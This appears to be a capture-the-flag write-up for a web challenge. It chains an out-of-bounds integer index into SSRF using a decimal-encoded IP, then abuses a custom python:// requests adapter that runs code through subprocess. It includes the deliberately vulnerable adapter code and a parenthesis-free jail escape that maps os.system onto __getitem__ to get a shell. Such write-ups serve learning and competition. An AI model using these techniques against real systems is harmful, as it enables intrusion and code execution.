We control `source_id` in the following snippet, which seems fairly limited...

```python
def resolve_feed(source_id: int) -> str:
    source = source_id
    if source_id >= 0 and source_id < len(AVAILABLE_SOURCES):
        source = AVAILABLE_SOURCES[source_id]

    source = f"http://{source}"
    return source
```

However, by using dot-decimal notation, we can specify a functional IP with only an integer.

```sh
sh-5.3$ ping $(rax2 -i 127.0.0.1 | rax2 -e)
PING 2130706433 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.023 ms
```

As such, we can use the `add-feed` functionality with an OOB index as a way to get SSRF to our server.

From there, we can return an RSS feed that contains one item with a malicious enclosure.
Since the enclosure URL is requested and stored in the hydrated feed, we can get the result of any request.

This is where the custom `python://` adapter comes into play, since it lets us execute Python code and get the result.

The custom adapter has a few banned characters (a fairly simple jail):

```python
class PythonAdapter(BaseAdapter):
    def send(
            self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None
    ):
        code = request.url[9:]
        code = re.sub(r"[\(\)@]", "", code)

        proc = subprocess.run(
            ["timeout", "1s", "python", "-c", code],
            stdout=subprocess.PIPE
        )

        response = Response()
        response.status_code = proc.returncode
        response._content = proc.stdout

        return response
```

The characters `()@` are disallowed, this is not too much of a problem since we can use magic functions such as `__add__`, `__getitem__`, etc. to trigger function calls without parentheses.

For instance:

```python
import os
help.__class__.__getitem__ = os.system
help['sh']
# leads to a shell
```

The solution server can be found [here](./stub.py)